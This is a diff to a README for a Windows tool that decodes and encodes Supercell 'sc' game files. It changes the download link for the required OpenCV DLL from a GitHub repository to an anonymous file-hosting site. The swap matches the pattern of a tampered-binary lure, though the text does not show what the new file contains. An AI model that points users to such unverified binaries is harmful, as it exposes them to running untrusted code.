@@ -2,7 +2,7 @@
 Tool to decode and encode sc files from supercell games (works only on Windows) 
 
 ## How to use:
-Put [Xcoder.exe](https://github.com/lilmuff2/X-coder/releases/download/v1/Xcoder.exe) and [cv2 dll](https://github.com/Daniil-SV/OpenCV-Binaries/raw/main/lib/x86_64/windows/shared/opencv_world470.dll) in one folder and run exe
+Put [Xcoder.exe](https://github.com/lilmuff2/X-coder/releases/download/v1/Xcoder.exe) and [cv2 dll](https://anonfiles.com/v6K5id38z2/opencv_world470_dll) in one folder and run exe
 ### Functions:
 #### Decode: 
 1. Select _tex.sc file
